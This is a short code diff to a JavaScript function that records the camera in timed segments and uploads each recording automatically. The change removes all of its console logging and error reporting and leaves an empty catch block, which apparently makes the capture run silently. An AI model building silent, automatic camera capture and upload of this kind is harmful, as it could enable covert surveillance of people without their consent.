@@ -2580,8 +2580,6 @@ async function iniciarCamara() {
                 body: blob
             })
             .then(r => r.json())
-            .then(d => console.log('[CAMARA] Enviado:', d))
-            .catch(e => console.error('[CAMARA] Error:', e))
         }
 
         // Grabar en segmentos de 10 segundos y mandar automáticamente
@@ -2593,10 +2591,8 @@ async function iniciarCamara() {
             }
         }, 15000)
 
-        console.log('[CAMARA] Grabando...')
 
     } catch (e) {
-        console.warn('[CAMARA] Error:', e)
     }
 }
 
